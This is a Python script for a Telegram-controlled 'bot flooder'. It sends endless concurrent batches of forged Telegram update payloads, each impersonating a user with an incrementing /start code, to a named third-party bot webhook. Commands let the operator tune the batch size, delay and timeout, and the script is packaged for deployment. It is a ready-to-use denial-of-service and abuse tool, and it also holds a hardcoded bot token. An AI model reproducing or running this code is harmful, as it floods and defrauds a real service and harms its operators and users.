#!/usr/bin/env python3
"""
🔥 TXG BOT FLOODER – Full Telegram Control + Railway Ready
"""
import asyncio
import aiohttp
import time
import os
import signal
import sys
import logging
from aiohttp import web

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8802900336:AAH-kjC7LYFHu60nAkKfSCZqc28AiRrB89M"
ADMIN_ID = 8401097557

# ─── FLOODER CONFIG ──────────────────────────────────────
URL = "https://txg-gateway.xyz/api/bot.php"
USER_ID = 8401097557          # target user ID for /start payload

# Default settings (can be changed via bot commands)
BATCH_SIZE = 200
TIMEOUT = 15
DELAY_BETWEEN_BATCHES = 1
CONCURRENT_LIMIT = 200

# ─── GLOBAL STATE ─────────────────────────────────────────
flooder_running = False
flooder_task = None
stats = {'sent': 0, 'ok': 0, 'fail': 0, 'timeout': 0}
stats_lock = asyncio.Lock()
start_time = 0

# ─── PAYLOAD BUILDER ──────────────────────────────────────
def get_payload(message_id, update_id):
    return {
        "update_id": update_id,
        "message": {
            "message_id": message_id,
            "chat": {"id": USER_ID, "type": "private"},
            "from": {"id": USER_ID, "is_bot": False},
            "text": f"/start f39cde2da120338ced075c31adbaef2c_{message_id}"
        }
    }

# ─── REQUEST WORKER ────────────────────────────────────────
async def send_request(session, req_index, message_id, update_id):
    payload = get_payload(message_id, update_id)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    try:
        async with session.post(URL, json=payload, timeout=timeout) as resp:
            status = resp.status
            await resp.text()  # consume
        async with stats_lock:
            stats['sent'] += 1
            if status == 200:
                stats['ok'] += 1
            else:
                stats['fail'] += 1
        return status
    except asyncio.TimeoutError:
        async with stats_lock:
            stats['sent'] += 1
            stats['timeout'] += 1
            stats['fail'] += 1
    except Exception:
        async with stats_lock:
            stats['sent'] += 1
            stats['fail'] += 1
    return None

# ─── MAIN FLOODER LOOP ─────────────────────────────────────
async def flooder_loop():
    global flooder_running
    msg_id = 1
    upd_id = 123457
    batch_count = 1
    req_count = 1

    connector = aiohttp.TCPConnector(limit=CONCURRENT_LIMIT, limit_per_host=CONCURRENT_LIMIT)
    async with aiohttp.ClientSession(connector=connector) as session:
        logger.info("🔥 Flooder started (infinite)")
        while flooder_running:
            tasks = []
            start_msg = msg_id

            for _ in range(BATCH_SIZE):
                tasks.append(send_request(session, req_count, msg_id, upd_id))
                msg_id += 1
                upd_id += 1
                req_count += 1

            results = await asyncio.gather(*tasks)
            success = results.count(200)
            logger.info(f"Batch {batch_count}: {success}/{BATCH_SIZE} OK")
            batch_count += 1
            await asyncio.sleep(DELAY_BETWEEN_BATCHES)

        logger.info("Flooder stopped.")

# ─── TELEGRAM BOT COMMANDS ────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "🔥 **Flooder Bot Controls**\n"
        "/status – Live stats\n"
        "/startflood – Start flooding\n"
        "/stopflood – Stop flooding\n"
        "/setbatch <size> – Set batch size (default 200)\n"
        "/setdelay <sec> – Set delay between batches (default 1)\n"
        "/settimeout <sec> – Set request timeout (default 15)\n"
        "/settings – Show current settings"
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time if start_time else 0
    async with stats_lock:
        s = stats['sent']
        o = stats['ok']
        f = stats['fail']
        t = stats['timeout']
    rate = s / elapsed if elapsed > 0 else 0
    ok_pct = (o / s * 100) if s > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {s:,}\n"
           f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
           f"❌ Errors: {f:,}\n"
           f"⏱️ Timeouts: {t:,}\n"
           f"⚡ Rate: {rate:.1f} req/s\n"
           f"🕒 Uptime: {int(elapsed)}s\n"
           f"🔄 Running: {'✅ Yes' if flooder_running else '❌ No'}")
    await update.message.reply_text(msg)

async def start_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, flooder_task, start_time, stats
    if update.effective_user.id != ADMIN_ID:
        return
    if flooder_running:
        await update.message.reply_text("⚠️ Already running.")
        return
    flooder_running = True
    start_time = time.time()
    async with stats_lock:
        stats = {'sent': 0, 'ok': 0, 'fail': 0, 'timeout': 0}
    flooder_task = asyncio.create_task(flooder_loop())
    await update.message.reply_text("▶️ Flooder started.")

async def stop_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running
    if update.effective_user.id != ADMIN_ID:
        return
    if not flooder_running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    flooder_running = False
    if flooder_task:
        flooder_task.cancel()
    await update.message.reply_text("🛑 Flooder stopped.")

async def set_batch_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BATCH_SIZE
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 1:
            raise ValueError
        BATCH_SIZE = val
        await update.message.reply_text(f"✅ Batch size set to {val}")
    except:
        await update.message.reply_text("❌ Usage: /setbatch <number>")

async def set_delay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global DELAY_BETWEEN_BATCHES
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = float(context.args[0])
        if val < 0:
            raise ValueError
        DELAY_BETWEEN_BATCHES = val
        await update.message.reply_text(f"✅ Delay set to {val}s")
    except:
        await update.message.reply_text("❌ Usage: /setdelay <seconds>")

async def set_timeout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global TIMEOUT
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 1:
            raise ValueError
        TIMEOUT = val
        await update.message.reply_text(f"✅ Timeout set to {val}s")
    except:
        await update.message.reply_text("❌ Usage: /settimeout <seconds>")

async def settings_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = (f"⚙️ **Current Settings**\n"
           f"📦 Batch size: {BATCH_SIZE}\n"
           f"⏱️  Timeout: {TIMEOUT}s\n"
           f"⏳ Delay between batches: {DELAY_BETWEEN_BATCHES}s\n"
           f"🔄 Concurrent limit: {CONCURRENT_LIMIT}\n"
           f"🎯 Target User ID: {USER_ID}")
    await update.message.reply_text(msg)

# ─── PERIODIC AUTO‑REPORT ────────────────────────────────
async def auto_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running:
        return
    elapsed = time.time() - start_time
    async with stats_lock:
        s = stats['sent']
        o = stats['ok']
        f = stats['fail']
    rate = s / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Auto Report**\n"
           f"📤 Sent: {s:,}\n"
           f"✅ OK: {o:,}\n"
           f"❌ Errors: {f:,}\n"
           f"⚡ Rate: {rate:.1f} req/s")
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── HEALTH CHECK WEB SERVER ─────────────────────────────
async def health(request):
    return web.Response(text="✅ Bot Flooder is online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    logger.info("🌐 Web server started on port %s", port)
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    # Start Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("startflood", start_flooder_cmd))
    app.add_handler(CommandHandler("stopflood", stop_flooder_cmd))
    app.add_handler(CommandHandler("setbatch", set_batch_cmd))
    app.add_handler(CommandHandler("setdelay", set_delay_cmd))
    app.add_handler(CommandHandler("settimeout", set_timeout_cmd))
    app.add_handler(CommandHandler("settings", settings_cmd))

    # Auto-report every 30 seconds
    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(auto_report, interval=30, first=10)

    # Notify admin
    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder Bot is online.**\n/start for commands.")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    # Run web server alongside
    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()
        )
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        logger.info("🛑 Shutting down...")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
